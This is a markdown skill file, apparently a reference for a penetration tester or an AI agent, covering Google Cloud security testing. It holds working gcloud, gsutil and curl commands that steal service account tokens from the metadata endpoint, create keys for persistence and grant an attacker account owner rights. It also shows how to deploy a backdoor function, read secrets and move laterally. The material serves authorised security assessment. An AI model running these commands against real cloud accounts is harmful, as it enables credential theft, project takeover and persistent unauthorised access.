---
name: gcp
description: GCP security testing covering project enumeration, service account abuse, metadata endpoints, Cloud Storage exposure, and IAM privilege escalation
---

# GCP Security Testing

GCP environments expose attack surfaces through misconfigured IAM policies, publicly accessible Cloud Storage buckets, overly permissive service accounts, and the instance metadata endpoint. Misconfigurations in organization policies, project-level bindings, and workload identity are common and frequently lead to privilege escalation, data exfiltration, and cross-project access.

## Attack Surface

**Scope**
- Cloud Storage buckets and objects
- IAM policies at organization, folder, and project levels
- Service accounts and their keys
- Compute Engine instances and metadata endpoints
- Cloud Functions and Cloud Run services
- GKE clusters and node pools
- BigQuery datasets and tables
- Cloud SQL instances
- Pub/Sub topics and subscriptions
- Secret Manager secrets
- Cloud KMS keys

**Entry Points**
- Compromised service account keys (JSON key files in repos, env vars)
- SSRF to metadata endpoint (metadata.google.internal / 169.254.169.254)
- Publicly accessible Cloud Storage buckets
- Overly permissive IAM bindings
- Exposed Cloud Functions or Cloud Run URLs
- Leaked credentials in CI/CD pipelines or container images
- OAuth2 token theft from compromised applications

**Authentication Methods**
- Service account JSON key files
- OAuth2 access tokens
- Application Default Credentials (ADC)
- Compute Engine metadata service tokens
- Workload Identity (GKE)
- Identity-Aware Proxy (IAP) tokens

## Key Vulnerabilities

### Project & Resource Enumeration

```bash
# List accessible projects
gcloud projects list

# List all resources in a project
gcloud asset search-all-resources --scope=projects/<project-id>

# List compute instances
gcloud compute instances list --all
gcloud compute instances list --all --project <project-id>

# List storage buckets
gsutil ls
gsutil ls -p <project-id>

# List service accounts
gcloud iam service-accounts list --project <project-id>

# List IAM bindings
gcloud projects get-iam-policy <project-id>

# List folders and org hierarchy
gcloud resource-manager folders list --organization=<org-id>
gcloud organizations list

# Asset inventory
gcloud asset search-all-resources --scope=organizations/<org-id> --asset-types=storage.googleapis.com/Bucket
```

### Service Account Abuse

**Enumeration:**
```bash
# List service accounts and keys
gcloud iam service-accounts list --project <project-id>
gcloud iam service-accounts keys list --iam-account=<sa-email>

# Check if SA can create keys (self-compromise)
gcloud iam service-accounts keys create key.json --iam-account=<sa-email>

# List roles bound to SA
gcloud projects get-iam-policy <project-id> --flatten="bindings[].members" \
  --filter="bindings.members:<sa-email>"
```

**Key Abuse:**
```bash
# Activate a stolen key
gcloud auth activate-service-account --key-file=stolen-key.json

# Generate new key for persistent access
gcloud iam service-accounts keys create new-key.json --iam-account=<target-sa-email>

# Impersonate service account (if iam.serviceAccounts.getAccessToken)
gcloud auth print-access-token --impersonate-service-account=<sa-email>
gcloud compute instances list --impersonate-service-account=<sa-email>
```

**Privilege Escalation:**
```bash
# iam.serviceAccountKeys.create - create key for any SA
gcloud iam service-accounts keys create key.json --iam-account=<admin-sa-email>

# iam.serviceAccounts.actAs + compute.instances.create
gcloud compute instances create pwned --service-account=<admin-sa> \
  --scopes=https://www.googleapis.com/auth/cloud-platform

# iam.serviceAccounts.implicitDelegation
# Allows SA A to get tokens for SA B that SA A can delegate to

# resourcemanager.projects.setIamPolicy - add self as owner
gcloud projects add-iam-policy-binding <project> \
  --member="serviceAccount:<current-sa>" --role="roles/owner"

# orgpolicy.policy.set - disable constraints
gcloud resource-manager org-policies set-policy policy.yaml --project <project>

# iam.roles.update - escalate custom role permissions
gcloud iam roles update <role-id> --project <project> --permissions="*"
```

### Instance Metadata

**GCE Metadata Endpoint:**
```bash
# Basic metadata (requires Metadata-Flavor header)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Instance metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/zone
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/description

# Project metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# Service account token (default SA)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# List all service accounts
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Get token for specific SA
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/<sa-email>/token"

# User data (startup script)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script

# Custom metadata attributes (often contain secrets)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/<key>

# SSH keys
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Kubelet env (GKE)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

**Metadata v1 vs v2:**
```bash
# v1 (legacy, no session token required - vulnerable to SSRF)
curl http://169.254.169.254/computeMetadata/v1/ -H "Metadata-Flavor: Google"

# v2 (not yet default on GCP as of 2024, but available)
# When enabled, metadata queries require a session token from a special endpoint
# Check if metadata endpoint requires special headers beyond Metadata-Flavor
```

### Cloud Storage Bucket Exposure

```bash
# List all buckets
gsutil ls

# Check bucket IAM
gsutil iam get gs://<bucket>

# Check ACLs (legacy)
gsutil acl get gs://<bucket>

# Check for public access
gsutil iam get gs://<bucket> | grep -i allUsers
gsutil iam get gs://<bucket> | grep -i allAuthenticatedUsers

# List objects (public)
gsutil ls -r gs://<public-bucket>

# Download objects
gsutil cp gs://<bucket>/<object> .

# Check for sensitive files
gsutil ls gs://<bucket>/*.sql gs://<bucket>/*.dump gs://<bucket>/*.env gs://<bucket>/*.key

# Check bucket versioning (may contain deleted sensitive files)
gsutil versioning get gs://<bucket>
gsutil ls -a gs://<bucket>

# Signed URL generation (if has storage.objects.create)
gsutil signurl -d 1h key.json gs://<bucket>/<object>
```

### IAM Privilege Escalation

**Direct Escalation Paths:**
```bash
# 1. Create key for privileged SA
gcloud iam service-accounts keys create key.json --iam-account=<admin-sa>

# 2. Set IAM policy (add owner role)
gcloud projects add-iam-policy-binding <project> \
  --member=user:attacker@gmail.com --role=roles/owner

# 3. Impersonate service account
gcloud --impersonate-service-account=<admin-sa> projects list

# 4. ActAs + Cloud Functions
gcloud functions deploy backdoor --runtime python39 \
  --trigger-http --service-account=<admin-sa> \
  --entry-point=handler --source=./cf/

# 5. ActAs + Compute
gcloud compute instances create privesc \
  --service-account=<admin-sa> \
  --scopes=cloud-platform

# 6. Org policy modification
gcloud resource-manager org-policies set-policy policy.yaml
```

**gcp-iam-collector Enumeration:**
```bash
# Map all IAM bindings across organization
python3 gcp_iam_collector.py --organization <org-id> --output iam_map.json

# Identify escalation paths
# Look for: roles/owner, roles/editor bound to SAs
# Look for: iam.serviceAccountKeys.create permission
# Look for: resourcemanager.projects.setIamPolicy
```

### Secret Manager & KMS

```bash
# List secrets
gcloud secrets list --project <project>

# Access secret value (if has permission)
gcloud secrets versions access latest --secret=<name>

# List KMS key rings
gcloud kms keyrings list --location=global

# Access KMS keys
gcloud kms keys list --keyring=<name> --location=global

# Decrypt with KMS key (if has permission)
gcloud kms decrypt --key=<key> --keyring=<ring> --location=global \
  --ciphertext-file=encrypted.bin --plaintext-file=decrypted.txt
```

### Cloud SQL & BigQuery

```bash
# List Cloud SQL instances
gcloud sql instances list

# Get connection info (may expose IP)
gcloud sql instances describe <instance>

# List BigQuery datasets
bq ls

# Query BigQuery (if has access)
bq query --use_legacy_sql=false "SELECT * FROM \`<project>.<dataset>.<table>\` LIMIT 10"
```

## Bypass Techniques

**Token Harvesting**
- Metadata endpoint tokens have 1-hour validity but auto-refresh
- Service account keys never expire unless manually rotated
- OAuth2 tokens from compromised applications may have broad scopes

**Project Boundary Bypass**
- Organization-level roles apply across all projects
- Shared VPC allows cross-project network access
- Cross-project service account references

**Workload Identity Bypass**
- GKE Workload Identity binds K8s SA to GCP SA
- If K8s SA token is compromised, GCP SA is also compromised
- Node SA (separate from workload SA) often has broader permissions

## Testing Methodology

1. **Credential discovery** - Check for SA keys in repos, env vars, metadata
2. **Identity mapping** - `gcloud auth list`, `gcloud config list`
3. **Permission enumeration** - Test API calls or use IAM simulator
4. **Metadata probe** - Extract tokens, custom attributes, startup scripts
5. **Storage audit** - List buckets, check IAM, test public access
6. **SA escalation** - Test key creation, impersonation, ActAs abuse
7. **Logging gaps** - Verify Cloud Audit Logs coverage
8. **Lateral movement** - Use harvested credentials to access other projects

## Tools

- **gcloud** - Primary GCP CLI tool
- **gsutil** - Cloud Storage CLI
- **gcp-iam-collector** - IAM binding enumeration and visualization
- **ScoutSuite** - Multi-cloud security auditing
- **Prowler** - GCP security assessment
- **gcpbucketbrute** - Cloud Storage bucket enumeration
- **stratus-red-team** - GCP attack simulation

## Validation Requirements

- Prove access to resources beyond intended scope (cross-project data, other SAs)
- Demonstrate privilege escalation path from initial access to elevated permissions
- Show actual token extraction from metadata and verify access level
- Document specific IAM bindings that enabled the bypass
- For Storage: show actual object read with request details
- Confirm logging gaps by performing logged vs unlogged actions

## False Positives

- SA key exists but is disabled or expired
- IAM binding exists but constrained by organization policy
- Metadata endpoint accessible but no useful service accounts configured
- Bucket IAM shows allUsers but blocked by VPC Service Controls
- Service account has roles/editor but project has no resources

## Impact

- Full project takeover from leaked service account keys
- Data exfiltration from publicly accessible Cloud Storage buckets
- Cross-organization access via organization-level IAM misconfig
- Cryptocurrency mining from hijacked Compute instances
- Secret extraction from Secret Manager and KMS
- Lateral movement across GCP projects via shared service accounts

## Pro Tips

1. Always check `gcloud auth list` and `gcloud config list` first
2. Metadata endpoint tokens auto-refresh - extract and use immediately
3. Service account keys are the #1 GCP credential leak vector
4. `roles/editor` is nearly as dangerous as `roles/owner` for escalation
5. Check `roles/iam.securityAdmin` - it can modify IAM policies
6. Custom roles with `*` permissions are equivalent to predefined admin roles
7. GKE node service accounts often have `cloud-platform` scope
